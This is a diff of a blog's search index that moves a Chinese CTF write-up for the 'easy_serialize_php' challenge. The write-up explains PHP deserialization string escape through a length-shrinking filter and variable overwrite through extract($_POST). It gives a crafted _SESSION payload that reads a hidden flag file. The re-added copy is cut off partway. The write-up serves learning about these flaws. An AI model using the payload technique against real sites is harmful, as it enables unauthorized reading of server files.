@@ -10,268 +10,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2019]安洵杯 easy_serialize_php</title>
-    <url>/rustymoon/2023/12/04/2019-easy-serialize-php/</url>
-    <content><![CDATA[<p>it’s been a long time to do ctf</p>
-<span id="more"></span>
-
-<p>看了原理觉得自己会了，实践起来Oh My Oh My God Yes or Yes not?</p>
-<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>先看一下源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// f 可以通过GET方式进行传参</span>
-
-<span class="token comment">//对特定字词进行过滤，</span>
-<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
-
-<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><font size="1">其实第一遍看的时候，只看出过滤和反序列化，以及三个 $function 带来的不同结果。</font></p>
-<p>里面的关键在于</p>
-<ul>
-<li><p><code>filter($img)</code></p>
-</li>
-<li><p><code>extract($_POST)</code></p>
-</li>
-<li><p><code>$serialize_info = filter(serialize($_SESSION));</code></p>
-</li>
-<li><p><code>$userinfo = unserialize($serialize_info);</code></p>
-<ul>
-<li><code>echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code></li>
-</ul>
-</li>
-</ul>
-<p>就写一点demo进行理解吧</p>
-<h2 id="filter-serialize"><a href="#filter-serialize" class="headerlink" title="filter &amp; serialize"></a>filter &amp; serialize</h2><h3 id="get-started"><a href="#get-started" class="headerlink" title="get started"></a>get started</h3><p>依照主要逻辑写了一个demo</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">//过滤（照搬）</span>
-<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pp5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token comment">//传入的参数值</span>
-<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"this is a demo"</span><span class="token punctuation">;</span>
-
-<span class="token comment">//序列化</span>
-<span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//过滤</span>
-<span class="token variable">$n1</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//反序列化</span>
-<span class="token variable">$n2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$n1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">echo</span> <span class="token string single-quoted-string">'serialize: &lt;br>'</span><span class="token operator">.</span><span class="token variable">$n</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string single-quoted-string">'filter: &lt;br>'</span><span class="token operator">.</span><span class="token variable">$n1</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string single-quoted-string">'unserialize: &lt;br>'</span><span class="token punctuation">;</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$n2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li>当 <code>$img = &quot;this is a demo&quot;</code> 的时候，返回：</li>
-</ul>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
-s:14:"this is a demo";
-filter:
-s:14:"this is a demo";
-unserialize:
-this is a demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li>当<code>$img = array(&#39;y&#39;=&gt; &#39;u&#39;,&#39;x&#39; =&gt; &#39;fun&#39;);</code>的时候，返回：</li>
-</ul>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
-a:2:&#123;s:1:"y";s:1:"u";s:1:"x";s:3:"fun";&#125;
-filter:
-a:2:&#123;s:1:"y";s:1:"u";s:1:"x";s:3:"fun";&#125;
-unserialize:
-array(2) &#123; ["y"]=> string(1) "u" ["x"]=> string(3) "fun" &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>一切都很正常。</p>
-<ul>
-<li>当 <code>$img = &quot;this is a flagdemo&quot;</code> 的时候，返回：</li>
-</ul>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
-s:18:"this is a flagdemo";
-filter:
-s:18:"this is a demo";
-unserialize:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li>当<code>$img = array(&#39;y&#39;=&gt; &#39;flag&#39;,&#39;php&#39; =&gt; &#39;fun&#39;);</code>的时候，返回：</li>
-</ul>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
-a:2:&#123;s:1:"y";s:4:"flag";s:3:"php";s:3:"fun";&#125;
-filter:
-a:2:&#123;s:1:"y";s:4:"";s:3:"";s:3:"fun";&#125;
-unserialize:
-bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p>发生了问题：</p>
-<p><strong>这个字符串无法被正确地反序列化。</strong>（当然这个不是重点但是有点funny）</p>
-<p>因为在序列化的字符串中，<code>s:18</code>表示接下来的字符串的长度应该是18。但是在<code>filter()</code>函数处理后，字符串的实际长度变为14，所以当你尝试使用<code>unserialize()</code>函数反序列化这个字符串时，它会返回<code>FALSE</code>，并产生一个<code>E_NOTICE</code>。</p>
-<p>如果是在其他题目，其实这种也很好绕过，双写 or 大小写（所以说正则表达式和白名单better at most of time）</p>
-<hr>
-<hr>
-
-<h3 id="abandoned"><a href="#abandoned" class="headerlink" title="abandoned"></a>abandoned</h3><p>unserialize()有一个机制</p>
-<ul>
-<li><code>&#123;&#125;</code><strong>内的会进行反序列，之外的抛弃。</strong></li>
-</ul>
-<p>如果<code>&#123;&#125;</code>内元素个数与规定的不一致会返回：<strong>bool(false)</strong></p>
-<p>比如：</p>
-<p><code>$dance = &quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;ddimg\&quot;;lajilaji&quot;;</code></p>
-<ul>
-<li>反序列化得到：<code>array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot; &#125;</code></li>
-</ul>
-<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p><code>extract($_POST);</code>，作用是将 POST （看作一个数组）传入的 数组 中的元素进行变量化</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
-    <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'John Doe'</span><span class="token punctuation">,</span>
-    <span class="token string single-quoted-string">'email'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'john@example.com'</span>
-<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">//得到</span>
-<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'John Doe'</span><span class="token punctuation">;</span>
-<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'john@example.com'</span><span class="token punctuation">;</span>
-
-<span class="token comment">//在之后的引用中，直接写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>该函数存在的一个安全问题——操作不当会<strong>覆盖原有变量</strong>。</p>
-<p>这也是本题的关键之处之一。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对存在的 $_SESSION进行重置 = NULL</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token comment">//可以理解 $_SESSION 是一个数组，目前里面有这两个键值对</span>
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
-
-<span class="token operator">...</span><span class="token operator">.</span>
-<span class="token comment">//该变量值为序列化后再过滤的 $_SESSION</span>
-<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token operator">...</span>
-<span class="token comment">//在前提条件下 $userinfo 变量值为 反序列化 后的上面那个变量（太长了懒得打），最后通过 file_get_contents函数将 base64 解码后的 键为 img 的变量的值输出</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<hr>
-
-<p>简单一个demo test</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
-
-<span class="token comment">//before</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>
-
-<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//after</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>POST传参：<code>_SESSION[flag]=123f</code>，结果是：</p>
-<p>&#x2F;&#x2F;before<br>array(2) { [“user”]&#x3D;&gt; string(5) “guest” [“function”]&#x3D;&gt; string(1) “f” }<br>&#x2F;&#x2F;after<br>array(1) { [“flag”]&#x3D;&gt; string(4) “123f” }</p>
-<p>this is<br><strong>变量覆盖</strong></p>
-<hr>
-<hr>
-
-<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>先捋一下：</p>
-<ul>
-<li><p>filter进行黑名单过滤关键词和符号</p>
-</li>
-<li><p>序列化</p>
-</li>
-<li><p>extract()函数存在可控变量</p>
-</li>
-<li><p>在 <code>$function == &#39;show_image&#39;</code>条件下进行输出</p>
-</li>
-<li><p>$_SESSION 经过 <strong>序列化</strong> 经过 <strong>自定义过滤</strong> 经过 <strong>反序列化</strong> 最后 召唤 img 键值</p>
-</li>
-</ul>
-<p>所以重点来到究竟传参什么</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//如果不存在 img_path 就赋值 $_SESSION['img'] 为 base64 编码后的 那个png</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token comment">//否则就赋值为 base64 编码后又SHA-1编码后的 img_path</span>
-    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token operator">...</span>
-<span class="token comment">//输出的是$_SESSION中的键 img 的值</span>
-<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>so,<br>传入一个抛弃原有 img 键值对的 <strong>新_SESSION</strong></p>
-<p><strong>构造（img 值要进行编码以适应解码）</strong>：<br><code>f = show_image</code>（GET传参构造条件）<br><code>_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
-<br>
-<br>
-
-<p>经过上述$_SESSION的取经路，</p>
-<ul>
-<li><p>serialize构造出一个<br><code>a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</code></p>
-</li>
-<li><p>过滤一下<br><code>a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</code></p>
-</li>
-<li><p>真正起作用的(抛弃多余部分)<br><code>a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
-</li>
-</ul>
-<p>可以看到 img 键值已经出现且重写。</p>
-<p>接收响应会得到</p>
-<p><code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code></p>
-<img src="/rustymoon/2023/12/04/2019-easy-serialize-php/get.png" class>
-
-<p>将那段字符base64 后甩入img值中，接收响应得到flag。</p>
-<h1 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h1><p>其实payload在进行反序列化的时候会出现问题，返回bool(false)，但是为什么依旧可以进行，有点不理解。</p>
-<img src="/rustymoon/2023/12/04/2019-easy-serialize-php/boolfalse.png" class>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP_SQL-Injection</title>
     <url>/rustymoon/2023/11/20/PHP-SQL-Injection/</url>
     <content><![CDATA[<p>有点好久不见，之前在入门之处学的第一个就是这个漏洞，不过那个时候学的是漏洞，没有涉及到专门分语言的。</p>
@@ -662,6 +400,268 @@ Stack trace:
       <tags>
         <tag>PHP</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2019]安洵杯 easy_serialize_php</title>
+    <url>/rustymoon/2023/12/04/2019-easy-serialize-php/</url>
+    <content><![CDATA[<p>it’s been a long time to do ctf</p>
+<span id="more"></span>
+
+<p>看了原理觉得自己会了，实践起来Oh My Oh My God Yes or Yes not?</p>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>先看一下源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// f 可以通过GET方式进行传参</span>
+
+<span class="token comment">//对特定字词进行过滤，</span>
+<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
+
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
